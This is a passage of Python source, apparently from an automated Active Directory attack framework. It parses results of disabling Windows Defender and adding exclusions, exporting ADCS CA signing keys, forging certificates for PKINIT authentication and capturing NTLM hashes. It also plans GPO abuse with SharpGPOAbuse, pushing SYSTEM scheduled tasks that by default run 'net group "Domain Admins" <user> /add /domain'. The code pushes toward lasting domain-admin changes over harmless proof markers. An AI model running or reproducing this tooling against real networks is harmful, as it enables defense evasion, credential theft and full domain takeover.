    requested_exclusion = _first_output_field(text, "EP_REQUESTED_EXCLUSION")
    error_text = _first_output_field(text, "EP_ERROR") or _first_output_field(text, "EP_SET_ERROR")
    status_read = status in {"ok", "already_inactive", "partial"} or any(
        item is not None for item in (realtime_before, realtime_after, antivirus_enabled, am_service_enabled)
    )
    endpoint_inactive = bool(
        status == "already_inactive"
        or antivirus_enabled is False
        or am_service_enabled is False
        or realtime_before is False
        or realtime_after is False
    )
    realtime_disabled_after = realtime_after is False
    requested_exclusion_present = exclusion_present is True
    set_failed = set_status in {"failed", "error"} or _has_any(
        low,
        ("ep_set_status=failed", "set-mppreference", "add-mppreference", "operation failed"),
    )
    cmdlet_missing = _has_any(
        low,
        (
            "get-mpcomputerstatus is not recognized",
            "set-mppreference is not recognized",
            "add-mppreference is not recognized",
            "no endpoint protection cmdlets",
        ),
    )
    logon_failure = _has_any(
        low,
        (
            "logon failure",
            "unknown user name or bad password",
            "the user name or password is incorrect",
            "1326",
        ),
    )
    access_denied = _has_any(low, ("access denied", "access is denied", "0x00000005", "unauthorizedaccessexception"))
    return {
        "target_host": host,
        "target_domain": domain,
        "adjustment_marker_seen": marker_line_seen,
        "endpoint_status_read": status_read,
        "endpoint_adjustment_proven": bool(realtime_disabled_after or requested_exclusion_present or endpoint_inactive),
        "endpoint_inactive": endpoint_inactive,
        "realtime_disabled_before": realtime_before is False,
        "realtime_disabled_after": realtime_disabled_after,
        "antivirus_enabled": antivirus_enabled is True,
        "amservice_enabled": am_service_enabled is True,
        "tamper_protected": tamper is True,
        "exclusion_present_before": exclusion_status == "already_present",
        "requested_exclusion_present": requested_exclusion_present,
        "requested_exclusion": requested_exclusion,
        "set_preference_failed": set_failed and not (realtime_disabled_after or requested_exclusion_present),
        "cmdlet_missing": cmdlet_missing,
        "access_denied": access_denied,
        "not_admin": access_denied or _has_any(low, ("administrator privileges", "requires elevation")),
        "logon_failure": logon_failure,
        "bad_password": logon_failure,
        "network_path_not_found": _has_any(low, ("network path was not found", "0x00000035")),
        "output_not_found": _has_any(low, ("ep_status=output_not_found", "output_not_found")),
        "wmi_unavailable": _has_any(low, ("invalid namespace", "wbem_e_", "0x800410")),
        "rpc_unavailable": _has_any(low, ("rpc server is unavailable", "0x800706ba")),
        "remote_process_created": _has_any(low, ("returnvalue = 0", "return value = 0", "processid", "process id")),
        "endpoint_error": error_text,
    }


def extract_adcs_ca_private_key_probe(
    output: Any = None,
    target_host: str = "",
    target_domain: str = "",
    proof_marker: str = "",
) -> dict[str, Any]:
    """Build a structured probe for ADCS CA signing-key export output."""
    text = _task_output_text(output)
    low = text.casefold()
    host = _normalize(_host_short(target_host))
    domain = _normalize(target_domain)
    marker = _text(proof_marker).strip()
    marker_line_seen = bool(
        (marker and re.search(rf"(?im)^\s*{re.escape(marker)}\s*$", text))
        or re.search(r"(?im)^\s*SAGE_CA_EXPORT_PROOF_[A-Za-z0-9_.-]+\s*$", text)
    )
    status = _first_output_field(text, "CA_EXPORT_STATUS").casefold()
    subject = _first_output_field(text, "CA_SUBJECT")
    issuer = _first_output_field(text, "CA_ISSUER")
    thumbprint = _first_output_field(text, "CA_THUMBPRINT")
    pfx_path = _first_output_field(text, "CA_PFX_PATH")
    pfx_base64 = _first_output_field(text, "PFX_BASE64")
    pfx_sha256 = _first_output_field(text, "PFX_SHA256")
    if not subject:
        subject = _first_output_field(text, "Subject")
    if not issuer:
        issuer = _first_output_field(text, "Issuer")
    if not thumbprint:
        thumbprint = _first_output_field(text, "Thumbprint")
    decoded = b""
    pfx_valid = False
    if pfx_base64:
        compact = re.sub(r"\s+", "", pfx_base64)
        try:
            decoded = base64.b64decode(compact, validate=True)
            pfx_valid = len(decoded) >= 256 and decoded[:1] == b"0"
        except Exception:
            decoded = b""
            pfx_valid = False
    computed_pfx_sha256 = hashlib.sha256(decoded).hexdigest() if decoded else ""
    pfx_sha256 = pfx_sha256.casefold()
    pfx_sha256_mismatch = bool(decoded and pfx_sha256 and pfx_sha256 != computed_pfx_sha256)
    if decoded and not pfx_sha256:
        pfx_sha256 = computed_pfx_sha256
    if pfx_sha256_mismatch:
        pfx_valid = False
    private_key_pem = bool(re.search(
        r"-----BEGIN (?:RSA |EC |DSA |)PRIVATE KEY-----[\s\S]+?-----END (?:RSA |EC |DSA |)PRIVATE KEY-----",
        text,
        re.IGNORECASE,
    ))
    certificate_pem = bool(re.search(
        r"-----BEGIN CERTIFICATE-----[\s\S]+?-----END CERTIFICATE-----",
        text,
        re.IGNORECASE,
    ))
    error_text = _first_output_field(text, "CA_EXPORT_ERROR")
    access_denied = _has_any(low, ("access denied", "access is denied", "0x00000005"))
    logon_failure = _has_any(
        low,
        (
            "logon failure",
            "unknown user name or bad password",
            "the user name or password is incorrect",
            "1326",
        ),
    )
    no_cert = status in {"no_ca_certificate", "no_ca_cert", "no_cert"} or _has_any(
        low,
        ("ca_export_status=no_ca_certificate", "no ca certificate", "no matching ca certificate"),
    )
    dpapi_completed = private_key_pem and _has_any(low, ("sharpdpapi", "certificates", "private key"))
    export_failed = status in {"failed", "error"} or _has_any(low, ("ca_export_status=failed", "export-pfxcertificate"))
    key_not_exportable = _has_any(
        low,
        (
            "key not valid for use in specified state",
            "private key is not exportable",
            "non-exportable private key",
            "cannot export private key",
            "ncrypt_export_policy_property",
        ),
    )
    tool_execution_failed = _has_any(
        low,
        (
            "the system cannot execute the specified program",
            "not a valid win32 application",
            "this app can't run on your pc",
            "side-by-side configuration is incorrect",
            "bad image",
        ),
    )
    return {
        "target_host": host,
        "target_domain": domain,
        "export_marker_seen": marker_line_seen,
        "ca_export_completed": status == "ok" or dpapi_completed or _has_any(low, ("ca_export_status=ok", "ca export status=ok")),
        "ca_certificate_identified": bool(subject or thumbprint or certificate_pem),
        "ca_subject_present": bool(subject),
        "ca_thumbprint_present": bool(thumbprint),
        "ca_subject": subject,
        "ca_issuer": issuer,
        "ca_thumbprint": thumbprint,
        "ca_pfx_path": pfx_path,
        "pfx_base64_present": bool(pfx_base64),
        "pfx_base64_length": len(re.sub(r"\s+", "", pfx_base64)) if pfx_base64 else 0,
        "pfx_blob_valid": pfx_valid,
        "pfx_sha256": pfx_sha256,
        "pfx_sha256_mismatch": pfx_sha256_mismatch,
        "private_key_pem_present": private_key_pem,
        "certificate_pem_present": certificate_pem,
        "ca_private_key_material_present": bool(pfx_valid or private_key_pem),
        "metadata_file_present": marker_line_seen or bool(subject or thumbprint or status),
        "remote_process_created": _has_any(low, ("returnvalue = 0", "return value = 0", "processid", "process id")),
        "no_ca_certificate": no_cert,
        "key_not_exportable": key_not_exportable,
        "tool_execution_failed": tool_execution_failed,
        "pfx_export_failed": export_failed and not (pfx_valid or private_key_pem),
        "access_denied": access_denied,
        "logon_failure": logon_failure,
        "bad_password": logon_failure,
        "network_path_not_found": _has_any(low, ("network path was not found", "0x00000035")),
        "output_not_found": _has_any(low, ("ca_export_status=output_not_found", "output_not_found")),
        "wmi_unavailable": _has_any(low, ("invalid namespace", "wbem_e_", "0x800410")),
        "rpc_unavailable": _has_any(low, ("rpc server is unavailable", "0x800706ba")),
        "export_error": error_text,
    }


def extract_adcs_enrolled_certificate_probe(
    output: Any = None,
    account: str = "",
    domain: str = "",
    proof_marker: str = "",
) -> dict[str, Any]:
    """Build a structured probe for ADCS ESC enrollment output."""
    text = _task_output_text(output)
    low = text.casefold()
    account = _normalize(account)
    domain = _normalize(domain)
    marker = _text(proof_marker).strip()
    marker_line_seen = bool(
        (marker and re.search(rf"(?im)^\s*{re.escape(marker)}\s*$", text))
        or re.search(r"(?im)^\s*SAGE_CERT_ENROLL_PROOF_[A-Za-z0-9_.-]+\s*$", text)
    )
    status = (
        _first_output_field(text, "CERT_ENROLL_STATUS")
        or _first_output_field(text, "ENROLL_CERT_STATUS")
        or _first_output_field(text, "ADCS_ENROLL_STATUS")
    ).casefold()
    template = _first_output_field(text, "CERT_ENROLL_TEMPLATE") or _first_output_field(text, "CertificateTemplate")
    ca_name = _first_output_field(text, "CERT_ENROLL_CA") or _first_output_field(text, "CA")
    pfx_path = (
        _first_output_field(text, "CERT_PFX_PATH")
        or _first_output_field(text, "ENROLL_CERT_PFX_PATH")
        or _first_output_field(text, "FORGED_PFX_PATH")
    )
    pfx_base64 = _first_output_field(text, "PFX_BASE64")
    pfx_sha256 = _first_output_field(text, "PFX_SHA256")
    decoded = b""
    pfx_valid = False
    if pfx_base64:
        compact = re.sub(r"\s+", "", pfx_base64)
        try:
            decoded = base64.b64decode(compact, validate=True)
            pfx_valid = len(decoded) >= 256 and decoded[:1] == b"0"
        except Exception:
            decoded = b""
            pfx_valid = False
    if decoded and not pfx_sha256:
        pfx_sha256 = hashlib.sha256(decoded).hexdigest()
    private_key_pem = bool(re.search(
        r"-----BEGIN (?:RSA |EC |DSA |)PRIVATE KEY-----[\s\S]+?-----END (?:RSA |EC |DSA |)PRIVATE KEY-----",
        text,
        re.IGNORECASE,
    ))
    certificate_pem = bool(re.search(
        r"-----BEGIN CERTIFICATE-----[\s\S]+?-----END CERTIFICATE-----",
        text,
        re.IGNORECASE,
    ))
    request_id = _first_output_field(text, "CERT_REQUEST_ID") or _first_output_field(text, "RequestId")
    denied = _has_any(
        low,
        (
            "cert_enroll_status=denied",
            "denied by policy module",
            "the requested certificate template is not supported",
            "certsrv_e_template_denied",
            "certificate request was denied",
        ),
    )
    template_missing = _has_any(low, ("template not found", "0x80094800", "certsrv_e_template_denied"))
    ca_unreachable = _has_any(low, ("rpc server is unavailable", "0x800706ba", "ca_unreachable", "certificate authority could not be contacted"))
    context_missing = _has_any(low, ("no credentials are available", "logon failure", "access is denied", "access denied"))
    tool_failed = _has_any(
        low,
        (
            "certreq failed",
            "certreq.exe :",
            "the system cannot execute the specified program",
            "not a valid win32 application",
            "bad image",
        ),
    )
    material_present = bool(pfx_valid or (certificate_pem and private_key_pem))
    return {
        "account": account,
        "domain": domain,
        "enroll_marker_seen": marker_line_seen,
        "certificate_enrollment_completed": status == "ok" or _has_any(
            low,
            (
                "cert_enroll_status=ok",
                "enroll_cert_status=ok",
                "certificate retrieved",
                "certificate request succeeded",
                "pfx_base64=",
            ),
        ),
        "certificate_request_submitted": bool(request_id) or _has_any(low, ("requestid", "request id", "submitted")),
        "certificate_request_issued": status == "ok" or _has_any(low, ("issued", "certificate retrieved", "cert_enroll_status=ok")),
        "template_found": bool(template) and not template_missing,
        "ca_reachable": bool(ca_name) and not ca_unreachable,
        "certificate_template": template,
        "certificate_authority": ca_name,
        "certificate_request_id": request_id,
        "certificate_pem_present": certificate_pem,
        "private_key_pem_present": private_key_pem,
        "enrolled_certificate_private_key_present": bool(pfx_valid or private_key_pem),
        "pfx_path": pfx_path,
        "pfx_base64_present": bool(pfx_base64),
        "pfx_base64_length": len(re.sub(r"\s+", "", pfx_base64)) if pfx_base64 else 0,
        "pfx_blob_valid": pfx_valid,
        "pfx_sha256": pfx_sha256,
        "enrolled_certificate_material_present": material_present,
        "certificate_request_denied": denied,
        "template_not_found": template_missing,
        "ca_unreachable": ca_unreachable,
        "enrollment_context_missing": context_missing,
        "tool_execution_failed": tool_failed,
        "access_denied": _has_any(low, ("access denied", "access is denied", "0x00000005")),
        "logon_failure": _has_any(low, ("logon failure", "unknown user name or bad password", "1326")),
    }


def extract_adcs_certificate_auth_probe(
    output: Any = None,
    account: str = "",
    domain: str = "",
    proof_marker: str = "",
) -> dict[str, Any]:
    """Build a structured probe for ForgeCert/PKINIT certificate authentication."""
    text = _task_output_text(output)
    low = text.casefold()
    marker = _text(proof_marker).strip()
    marker_line_seen = bool(
        (marker and re.search(rf"(?im)^\s*{re.escape(marker)}\s*$", text))
        or re.search(r"(?im)^\s*SAGE_CERT_AUTH_PROOF_[A-Za-z0-9_.-]+\s*$", text)
    )
    try:
        try:
            from . import credential_artifacts
        except ImportError:
            import credential_artifacts
        ticket_probe = dict(credential_artifacts.extract_ticket_probe(text))
    except Exception:
        ticket_probe = {}

    cert_status = _first_output_field(text, "CERT_FORGE_STATUS").casefold()
    pkinit_status = _first_output_field(text, "CERT_PKINIT_STATUS").casefold()
    cert_auth_status = _first_output_field(text, "CERT_AUTH_STATUS").casefold()
    cert_auth_method = _first_output_field(text, "CERT_AUTH_METHOD").casefold()
    cert_auth_ldap_bind = _parse_probe_bool(_first_output_field(text, "CERT_AUTH_LDAP_BIND"))
    cert_auth_domain_admin = _parse_probe_bool(_first_output_field(text, "CERT_AUTH_DOMAIN_ADMIN"))
    pfx_path = _first_output_field(text, "FORGED_PFX_PATH") or _first_output_field(text, "CERT_PFX_PATH")
    ntlm_hash = _first_output_field(text, "NTLM") or _first_output_field(text, "NTLM_HASH")
    if not ntlm_hash:
        match = re.search(r"(?im)^\s*(?:NTLM|Hash NTLM)\s*[:=]\s*([0-9a-f]{32})\s*$", text)
        ntlm_hash = match.group(1) if match else ""
    ticket_b64 = _first_multiline_base64_after(text, r"base64\(ticket\.kirbi\)")
    certificate_forged = (
        cert_status == "ok"
        or _has_any(low, ("forgecert", "forged certificate", "newcertpath", "--newcertpath"))
    ) and not _has_any(low, ("cert_forge_status=failed", "certificate forge failed"))
    pkinit_tgt = bool(
        pkinit_status == "ok"
        or ticket_b64
        or _has_any(low, ("tgt request successful", "base64(ticket.kirbi)"))
    )
    service_access = bool(
        ticket_probe.get("service_access_proven")
        or cert_auth_status == "ok"
        or cert_auth_ldap_bind is True
        or _has_any(low, ("certificate_auth_proven=true", "cert_auth_status=ok"))
    )
    schannel_domain_admin = bool(
        cert_auth_domain_admin is True
        or re.search(r"(?im)^\s*CERT_AUTH_MEMBER_OF\s*[:=]\s*CN=Domain Admins,", text)
        or re.search(r"(?im)^\s*CERT_AUTH_PRIMARY_GROUP_ID\s*[:=]\s*512\s*$", text)
    )
    domain_admin = bool(ticket_probe.get("domain_admin") or schannel_domain_admin)
    ntlm_hash_present = bool(re.fullmatch(r"[0-9a-fA-F]{32}", ntlm_hash.strip()))
    auth_specific = bool(
        pkinit_tgt
        or cert_auth_status == "ok"
        or cert_auth_ldap_bind is True
        or ntlm_hash_present
        or cert_auth_method in {"pkinit", "schannel-ldap", "schannel_ldap", "certipy", "cert-auth", "certificate-auth"}
    )
    access_denied = _has_any(low, ("access is denied", "access denied", "0x80070005"))
    pkinit_not_supported = _has_any(low, ("kdc_err_padata_type_nosupp", "padata type nosupp", "krb-error (16)"))
    pkinit_failed = (
        pkinit_status in {"failed", "error"}
        or _has_any(low, ("kdc_err", "krb_ap_err", "pkinit failed", "client not trusted"))
    )
    certificate_forge_failed = cert_status in {"failed", "error"} or _has_any(
        low,
        ("cert_forge_status=failed", "certificate forge failed", "cannot find ca cert", "ca private key missing"),
    )
    return {
        "account": _normalize(account),
        "domain": _normalize(domain),
        "auth_marker_seen": marker_line_seen,
        "certificate_forged": certificate_forged,
        "forged_certificate_present": bool(pfx_path or certificate_forged),
        "forged_certificate_path": pfx_path,
        "certificate_auth_status": cert_auth_status,
        "certificate_auth_method": cert_auth_method,
        "schannel_ldap_bind": cert_auth_ldap_bind is True,
        "pkinit_tgt_present": pkinit_tgt,
        "tgt_present": bool(pkinit_tgt or ticket_probe.get("tgt_present")),
        "ticket_valid": bool((ticket_probe.get("ticket_valid") or service_access) and auth_specific),
        "service_access_proven": service_access,
        "certificate_auth_proven": bool(auth_specific and (service_access or domain_admin)),
        "domain_admin": domain_admin,
        "member_of": ticket_probe.get("member_of", []),
        "ticket_imported": _has_any(low, ("added ticket", "ticket successfully imported", "ticket_store_add")),
        "ticket_context_created": _has_any(low, ("successfully impersonated", "make_token", "netonly", "newcredentials")),
        "ntlm_hash_present": ntlm_hash_present,
        "ptt_attempted": "/ptt" in low,
        "ca_pfx_missing": _has_any(low, ("ca_pfx_missing", "ca cert path not found", "could not find ca cert")),
        "certificate_forge_failed": certificate_forge_failed,
        "forged_certificate_missing": _has_any(low, ("forged_certificate_missing", "new cert not found")),
        "pkinit_failed": pkinit_failed,
        "pkinit_not_supported": pkinit_not_supported,
        "kdc_rejected": _has_any(low, ("kdc_err", "client not trusted", "kdc rejected")),
        "bad_certificate": _has_any(low, ("invalid certificate", "cannot find object or property", "smartcard logon is required")),
        "ticket_injection_failed": _has_any(low, ("ticket_store_add failed", "failed to add ticket")),
        "logon_context_failed": _has_any(low, ("make_token failed", "logon failure", "unknown user name or bad password")),
        "access_denied": access_denied and not service_access,
        "ticket_error": bool(ticket_probe.get("ticket_error") or pkinit_failed or certificate_forge_failed),
    }


def _build_gpo_system_exec_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    intent = dict(action.intent or {})
    gpo_guid_input = (
        _input_text(inputs, "gpo_guid", "guid", "gpo_object_guid")
        or _text(intent.get("gpo_guid") or intent.get("guid") or intent.get("gpo_object_guid"))
        or fields.get("gpo_guid")
        or fields.get("guid")
        or fields.get("gpo_object_guid")
    )
    gpo = _normalize(
        intent.get("gpo")
        or intent.get("gpo_name")
        or intent.get("gponame")
        or intent.get("gpo_display_name")
        or fields.get("gpo")
        or fields.get("gpo_name")
        or fields.get("gponame")
        or fields.get("gpo_display_name")
        or _input_text(inputs, "gpo", "gpo_name", "gponame", "gpo_display_name")
        or _text(gpo_guid_input).strip().strip("{}")
    )
    domain = _normalize(intent.get("domain") or fields.get("domain") or _input_text(inputs, "domain"))
    if not gpo:
        return CapabilityExecutionPlan(False, missing=["gpo"], reason="gpo-controlled-system-exec needs a GPO")
    if not domain:
        return CapabilityExecutionPlan(False, missing=["domain"], reason="gpo-controlled-system-exec needs a domain")

    slug = _slug(gpo)
    explicit_proof_path = _input_text(inputs, "proof_path") or _text(intent.get("proof_path"))
    explicit_proof_unc = _input_text(inputs, "proof_unc") or _text(intent.get("proof_unc"))
    proof_path = explicit_proof_path or f"C:\\Users\\Public\\sage_gpo_{slug}_whoami.txt"
    proof_read_path = explicit_proof_unc or proof_path
    explicit_command_path = (
        _input_text(inputs, "command_path", "system_command", "command", "executable")
        or _text(intent.get("command_path") or intent.get("system_command") or intent.get("command") or intent.get("executable"))
    )
    explicit_command_arguments = (
        _input_text(inputs, "command_arguments", "system_arguments", "arguments", "args")
        or _text(
            intent.get("command_arguments")
            or intent.get("system_arguments")
            or intent.get("arguments")
            or intent.get("args")
        )
    )
    command_path = (
        explicit_command_path
        or "cmd.exe"
    )
    command_arguments = explicit_command_arguments
    raw_task_name = _input_text(inputs, "task_name") or _text(intent.get("task_name"))
    explicit_task_name = _task_name_from_text(raw_task_name) if raw_task_name else ""
    task_name = explicit_task_name or _task_name("GPO", gpo, "system-proof")
    gpo_tool = _input_text(inputs, "gpo_tool") or _text(intent.get("gpo_tool") or intent.get("tool")) or "SharpGPOAbuse.exe"
    affected_dc_hosts = _dedupe_texts(
        [
            *_input_list(inputs, "affected_dc_hosts", "affected_dcs", "dc_hosts"),
            *_input_list(intent, "affected_dc_hosts", "affected_dcs", "dc_hosts"),
            *_input_list(inputs, "target_dc", "target_dcs", "target_domain_controller", "target_domain_controllers"),
            *_input_list(intent, "target_dc", "target_dcs", "target_domain_controller", "target_domain_controllers"),
        ]
    )
    affected_hosts = _dedupe_texts(
        [
            *_input_list(inputs, "affected_hosts", "affected_computer_hosts", "affected_computers", "computer_hosts"),
            *_input_list(intent, "affected_hosts", "affected_computer_hosts", "affected_computers", "computer_hosts"),
            *affected_dc_hosts,
        ]
    )
    current_host = _normalize(
        _input_text(inputs, "current_host", "callback_host", "foothold_host", "local_host")
        or _text(
            intent.get("current_host")
            or intent.get("callback_host")
            or intent.get("foothold_host")
            or intent.get("local_host")
        )
    )
    ldap_server = (
        _input_text(
            inputs,
            "ldap_server",
            "domain_controller",
            "dc",
            "target_dc",
            "target_domain_controller",
            "target_host",
            "host",
        )
        or _text(
            intent.get("ldap_server")
            or intent.get("domain_controller")
            or intent.get("dc")
            or intent.get("target_dc")
            or intent.get("target_domain_controller")
            or intent.get("target_host")
            or intent.get("host")
        )
        or (affected_dc_hosts[0] if affected_dc_hosts else "")
    )
    ldap_server = _host_fqdn(ldap_server, domain)
    method = _normalize(
        _input_text(inputs, "method", "execution_method", "delivery_method")
        or _text(intent.get("method") or intent.get("execution_method") or intent.get("delivery_method"))
    )
    proof_only_requested = (
        _input_bool(inputs, "allow_proof_only", default=False)
        or _input_bool(inputs, "proof_only", default=False)
        or _input_bool(intent, "allow_proof_only", default=False)
        or _input_bool(intent, "proof_only", default=False)
    )
    preferred_effect = _normalize(
        _input_text(inputs, "preferred_effect", "intended_effect", "effect")
        or _text(intent.get("preferred_effect") or intent.get("intended_effect") or intent.get("effect"))
    )
    domain_admin_effect_requested = (
        _is_domain_admin_group_add(command_arguments)
        or preferred_effect in {"domain-admin-membership", "domain-admin", "da"}
        or any(_normalize(effect) == f"da:{domain}" for effect in (action.effects or []))
    )
    proof_marker_command_requested = (
        bool(command_arguments)
        and not _is_domain_admin_group_add(command_arguments)
        and _gpo_command_uses_shell_redirection(command_arguments)
    )
    if proof_marker_command_requested and not proof_only_requested:
        controlled_principal = _gpo_controlled_principal(inputs, intent)
        if not controlled_principal:
            return CapabilityExecutionPlan(
                False,
                missing=["controlled_principal"],
                reason=(
                    "GPO SYSTEM commands that rely on shell redirection are proof-only diagnostics; "
                    "pass controlled_principal/current_user for a durable domain-visible change, "
                    "or set allow_proof_only=true for an explicit diagnostic probe"
                ),
            )
        command_path = "cmd.exe"
        command_arguments = _domain_admin_group_add_arguments(controlled_principal)
        domain_admin_effect_requested = True
    durable_admin_default = (bool(affected_dc_hosts) or domain_admin_effect_requested) and not proof_only_requested
    if durable_admin_default and not _is_domain_admin_group_add(command_arguments):
        controlled_principal = _gpo_controlled_principal(inputs, intent)
        if not controlled_principal:
            return CapabilityExecutionPlan(
                False,
                missing=["controlled_principal"],
                reason=(
                    "DC-scoped GPO SYSTEM execution must make a durable domain-visible change; "
                    "pass controlled_principal/current_user or set allow_proof_only=true for a proof-only probe"
                ),
            )
        command_path = "cmd.exe"
        command_arguments = _domain_admin_group_add_arguments(controlled_principal)
    if not command_arguments:
        if not proof_only_requested:
            return CapabilityExecutionPlan(
                False,
                missing=["system_action"],
                reason=(
                    "gpo-controlled-system-exec needs an explicit command/arguments or a concrete durable effect; "
                    "pass allow_proof_only=true only for a diagnostic proof marker"
                ),
            )
        command_arguments = f"/c whoami > {proof_path}"
    command_arguments = _normalize_gpo_system_task_arguments(command_arguments)
    if not explicit_task_name and _is_domain_admin_group_add(command_arguments):
        task_name = _task_name("GPO", gpo, "domain-admin-" + _domain_admin_group_add_principal(command_arguments))
    if not explicit_proof_path:
        redirected_proof_path = _gpo_system_task_redirect_path(command_arguments)
        if redirected_proof_path:
            proof_path = redirected_proof_path
            if not explicit_proof_unc:
                proof_read_path = redirected_proof_path
    fallback_requested = method in {
        "fallback",
        "gpp-fallback",
        "gpp-immediate-task",
        "gpp-immediate-task-fallback",
        "manual-gpp",
    } or inputs.get("fallback_gpp") is True
    if fallback_requested and durable_admin_default and not _gpo_fallback_repair_allowed(inputs, intent):
        fallback_requested = False
    if fallback_requested:
        gpo_guid = _text(gpo_guid_input)
        steps = [
            CapabilityExecutionStep(
                operation="gpo-immediate-task-fallback",
                parameters={
                    "domain": domain,
                    "gpo": gpo,
                    "gpo_guid": gpo_guid,
                    "task_name": task_name,
                    "author": "NT AUTHORITY\\SYSTEM",
                    "command": command_path,
                    "arguments": command_arguments,
                    "proof_path": proof_path,
                    "ldap_server": ldap_server,
                },
                capability=action.name,
                purpose="write or repair a GPP immediate computer task, CSE registration, LDAP version, and GPT.INI version",
                expected_probe="extract_gpo_system_exec_probe",
            )
        ]
        if inputs.get("force_refresh", True) is not False and _gpo_local_refresh_applies(current_host, affected_hosts):
            steps.append(CapabilityExecutionStep(
                operation="gpo-refresh-local",
                parameters={"domain": domain, "gpo": gpo},
                capability=action.name,
                purpose="force local Group Policy processing on the current GPO-affected foothold",
                expected_probe="extract_gpo_system_exec_probe",
                prerequisites=["artifact:gpo_immediate_task"],
            ))
        wait_aliases = (
            "wait_seconds",
            "gpo_wait_seconds",
            "gp_refresh_wait_seconds",
            "dc_refresh_wait_seconds",
            "delay_seconds",
        )
        wait_seconds = _input_int(inputs, *wait_aliases, default=_input_int(intent, *wait_aliases, default=300))
        if wait_seconds > 0:
            steps.append(CapabilityExecutionStep(
                operation="gpo-wait",
                parameters={
                    "seconds": wait_seconds,
                    "reason": f"wait for Group Policy refresh after GPO task write for {gpo}@{domain}",
                },
                capability=action.name,
                purpose="wait a bounded Group Policy refresh window before polling the effect",
                expected_probe="extract_gpo_system_exec_probe",
                prerequisites=["artifact:gpo_immediate_task"],
            ))
        domain_admin_group_add = _is_domain_admin_group_add(command_arguments)
        if domain_admin_group_add:
            steps.append(CapabilityExecutionStep(
                operation="gpo-domain-admin-membership-proof",
                parameters={"domain": domain, "principal": _domain_admin_group_add_principal(command_arguments)},
                capability=action.name,
                purpose="poll the domain-visible effect of the GPO SYSTEM group-add",
                expected_probe="extract_gpo_domain_admin_membership_probe",
                prerequisites=["artifact:gpo_immediate_task"],
            ))
        else:
            steps.append(CapabilityExecutionStep(
                operation="gpo-proof-read",
                parameters={"proof_path": proof_read_path},
                capability=action.name,
                purpose="read the marker written by the GPO SYSTEM task; only this proof can record system-exec",
                expected_probe="extract_gpo_system_exec_probe",
                prerequisites=["artifact:gpo_immediate_task", "event:group_policy_refresh"],
            ))
        return CapabilityExecutionPlan(
            True,
            steps=steps,
            reason=(
                "built deterministic GPP immediate-task fallback with refresh and membership proof"
                if domain_admin_group_add else
                "built deterministic GPP immediate-task fallback with refresh and proof-read steps"
            ),
        )
    steps = [
        CapabilityExecutionStep(
            operation="gpo-computer-task",
            parameters={
                "tool": gpo_tool,
                "gpo": gpo,
                "task_name": task_name,
                "author": "NT AUTHORITY\\SYSTEM",
                "command": command_path,
                "arguments": command_arguments,
                "force": True,
            },
            capability=action.name,
            purpose="create a computer-context scheduled task through the controlled GPO",
            expected_probe="extract_gpo_system_exec_probe",
        )
    ]
    policy_guid = _braced_guid(gpo_guid_input)
    if policy_guid:
        steps.append(CapabilityExecutionStep(
            operation="structured-artifact-read",
            parameters={
                "path": (
                    f"\\\\{domain}\\SYSVOL\\{domain}\\Policies\\{policy_guid}"
                    "\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
                ),
                "artifact_type": "xml",
                "format": "xml",
            },
            capability=action.name,
            purpose="read back the structured setup artifact and validate it before waiting on effects",
            expected_probe="extract_gpo_system_exec_probe",
            prerequisites=["artifact:gpo_immediate_task"],
        ))
    wait_aliases = (
        "wait_seconds",
        "gpo_wait_seconds",
        "gp_refresh_wait_seconds",
        "dc_refresh_wait_seconds",
        "delay_seconds",
    )
    wait_seconds = _input_int(inputs, *wait_aliases, default=_input_int(intent, *wait_aliases, default=300))
    if wait_seconds > 0:
        steps.append(CapabilityExecutionStep(
            operation="gpo-wait",
            parameters={
                "seconds": wait_seconds,
                "reason": f"wait for Group Policy refresh after GPO task write for {gpo}@{domain}",
            },
            capability=action.name,
            purpose="wait a bounded Group Policy refresh window before polling the effect",
            expected_probe="extract_gpo_system_exec_probe",
            prerequisites=["artifact:gpo_immediate_task"],
        ))
    domain_admin_group_add = _is_domain_admin_group_add(command_arguments)
    if domain_admin_group_add:
        steps.append(CapabilityExecutionStep(
            operation="gpo-domain-admin-membership-proof",
            parameters={"domain": domain, "principal": _domain_admin_group_add_principal(command_arguments)},
            capability=action.name,
            purpose="poll the domain-visible effect of the GPO SYSTEM group-add",
            expected_probe="extract_gpo_domain_admin_membership_probe",
            prerequisites=["artifact:gpo_immediate_task"],
        ))
    else:
        steps.append(CapabilityExecutionStep(
            operation="gpo-proof-read",
            parameters={"proof_path": proof_read_path},
            capability=action.name,
            purpose="read the marker written by the GPO SYSTEM task; only this proof can record system-exec",
            expected_probe="extract_gpo_system_exec_probe",
            prerequisites=["artifact:gpo_immediate_task", "event:group_policy_refresh"],
        ))
    return CapabilityExecutionPlan(
        True,
        steps=steps,
        reason=(
            "built generic GPO computer-task group-add transaction with bounded refresh and membership proof"
            if domain_admin_group_add else
            "built generic GPO computer-task execution transaction with bounded refresh and proof steps"
        ),
    )


def _input_int(inputs: dict[str, Any], *keys: str, default: int = 0) -> int:
    for key in keys:
        value = inputs.get(key)
        if value is None or value == "":
            continue
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return default


def _is_domain_admin_group_add(arguments: str) -> bool:
    low = _text(arguments).casefold()
    return bool(
        "domain admins" in low
        and "/add" in low
        and "/domain" in low
        and re.search(r"\bnet(?:\.exe)?\s+group\b", low)
    )


def _gpo_command_uses_shell_redirection(arguments: str) -> bool:
    text = _text(arguments)
    return bool(re.search(r"(?<!\d)>\s*|[12]>\s*&\s*[12]", text))


def _gpo_controlled_principal(inputs: dict[str, Any], intent: dict[str, Any]) -> str:
    principal = (
        _input_text(inputs, "controlled_principal", "current_user", "current_identity", "foothold_identity", "principal")
        or _input_text(intent, "controlled_principal", "current_user", "current_identity", "foothold_identity", "principal")
    )
    return _text(principal).strip()


def _domain_admin_group_add_arguments(principal: str) -> str:
    member = _principal_sam_name(principal)
    if not member:
        return ""
    member_arg = member if re.fullmatch(r"[A-Za-z0-9_.@$-]+", member) else f'"{member}"'
    return f'/c net group "Domain Admins" {member_arg} /add /domain'


def _principal_sam_name(principal: str) -> str:
    text = _text(principal).strip().strip("\"'")
    if "\\" in text:
        text = text.rsplit("\\", 1)[-1]
    if "@" in text:
        text = text.split("@", 1)[0]
    return text.strip().strip("\"'")


def _gpo_fallback_repair_allowed(inputs: dict[str, Any], intent: dict[str, Any]) -> bool:
    for source in (inputs, intent):
        for key in (
            "primary_failure_observed",
            "sharp_gpo_primary_failed",
